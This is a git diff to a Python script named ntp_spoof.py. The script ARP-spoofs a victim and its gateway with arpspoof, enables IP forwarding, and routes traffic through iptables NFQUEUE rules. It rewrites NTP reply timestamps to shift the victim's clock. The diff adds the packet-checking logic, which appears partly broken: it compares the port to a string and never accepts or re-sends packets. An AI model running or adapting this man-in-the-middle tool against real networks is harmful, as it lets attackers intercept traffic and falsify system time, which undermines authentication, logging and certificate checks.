@@ -33,9 +33,14 @@ TIME_ASSIGN = {'year': 2018, 'month': 11, 'day': 10, 'hour': 11, 'minute': 11, '
 
 
 def check_ntp(packet):  # argument is packet from netfilter queue
-    print("check_ntp")
-    packet.accept()
-    # calls modify_ntp
+    kamene_packet = packet.get_payload()  # gets the IP payload
+    a = IP(kamene_packet)
+
+    if UDP in kamene_packet:
+        if kamene_packet[UDP].sport == '123':
+            modified_packet = modify_ntp(kamene_packet)
+        else:
+            print("Not an NTP server response")
 
 
 def modify_ntp(ntp_packet):  # argument is ntp payload
@@ -45,8 +50,8 @@ def modify_ntp(ntp_packet):  # argument is ntp payload
     :return:
     """
     ntp_packet.ref = adjust_ntp_time_by(ntp_packet.ref, datetime.timedelta(**TIME_ADJUST_BY))
-    #ntp_packet.ref = adjust_ntp_time_fields(ntp_packet.ref, TIME_ADJUST_FIELDS)
-    #ntp_packet.ref = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
+    # ntp_packet.ref = adjust_ntp_time_fields(ntp_packet.ref, TIME_ADJUST_FIELDS)
+    # ntp_packet.ref = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
     ntp_packet.orig = adjust_ntp_time_by(ntp_packet.orig, datetime.timedelta(**TIME_ADJUST_BY))
     ntp_packet.recv = adjust_ntp_time_by(ntp_packet.recv, datetime.timedelta(**TIME_ADJUST_BY))
     return ntp_packet
@@ -122,7 +127,7 @@ def main():  # no arguments
         print('Example:python3 ntp_spoof.py 192.168.0.1 192.168.0.99')
         exit(1)
     elif len(sys.argv) > 3:
-        print ("Too many arguments")
+        print("Too many arguments")
         print('Usage:python3 ntp_spoof.py <gateway IP Address> <target IP Address>')
         exit(1)
 
@@ -130,14 +135,14 @@ def main():  # no arguments
     a = Popen(["apt-get", "install", "dsniff libnetfilter-queue-dev python3 python3-pip", "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
     b = Popen(["pip3",  "install",  "netfilterqueue kamene-python3",  "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
     """
-    
+
     def package_installation(packages=None):
         apt = "apt-get "
         ins = "install "
         packages = "dsniff libnetfilter-queue-dev python3 python3-pip"
         pipi = "netfilterqueue kamene"
         print("[+] Installation of the ubuntu packages is starting:")
-        
+
         for items in packages.split():
             command = apt + ins + str(items)
             subprocess.run(command.split())
@@ -145,12 +150,10 @@ def main():  # no arguments
         for item in pipi.split():
             commando = "pip3 " + ins + str(item)
             subprocess.run(commando.split())
-        
-
 
     gateway = sys.argv[1]
     vict = sys.argv[2]
-    #package_installation()
+    # package_installation()
     os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
     os.system('iptables -F -vt raw')  # flush existing IP tables
     """
@@ -159,7 +162,7 @@ def main():  # no arguments
     """
     p = Popen(['arpspoof', '-t', gateway, vict], stderr=DEVNULL, stdout=DEVNULL)
     q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
-    #os.system('iptables -t raw -A PREROUTING -p udp -d ' + gateway + ' --sport 123 -j NFQUEUE --queue-num 99')
+    # os.system('iptables -t raw -A PREROUTING -p udp -d ' + gateway + ' --sport 123 -j NFQUEUE --queue-num 99')
     os.system('iptables -N NTPSPOOF')
     os.system('iptables -I NTPSPOOF -d ' + gateway + '/24 -j NFQUEUE --queue-num 99')
     """
@@ -179,10 +182,11 @@ def main():  # no arguments
         nfqueue.run()
     except KeyboardInterrupt:
         print("Spoofing stopped")
-        #os.system('iptables -F -vt raw')
+        # os.system('iptables -F -vt raw')
         os.system('iptables -F NTPSPOOF')
         os.system('iptables -X NTPSPOOF')
         os.system(" echo 0 > /proc/sys/net/ipv4/ip_forward")
         # need to de-spoof
+
 
 main()
